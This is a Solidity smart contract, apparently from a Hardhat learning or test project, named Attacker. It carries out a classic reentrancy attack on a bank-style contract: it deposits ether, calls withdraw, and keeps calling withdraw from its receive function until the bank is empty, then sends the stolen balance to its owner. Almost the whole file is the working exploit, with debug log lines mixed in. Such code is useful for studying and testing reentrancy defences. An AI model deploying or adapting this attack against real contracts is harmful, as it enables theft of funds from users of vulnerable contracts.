// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/access/Ownable.sol";
import "hardhat/console.sol";

interface IBank {
    function deposit() external payable;

    function withdraw() external;
}

contract Attacker is Ownable {
    IBank public immutable bankContract;

    constructor(address bankContractAddress) {
        bankContract = IBank(bankContractAddress);
    }

    function attack() external payable onlyOwner {
        bankContract.deposit{value: msg.value}();
        console.log("bankContract", address(bankContract).balance);
        console.log("halit");
        bankContract.withdraw();
        console.log("salihoglu");
    }

    receive() external payable {
        // receive function is called when contract receives ether
        if (address(bankContract).balance > 0) {
            console.log("there are still money in bank");
            bankContract.withdraw();
        } else {
            console.log("no money left in bank");
            payable(owner()).transfer(address(this).balance);
        }
    }
}
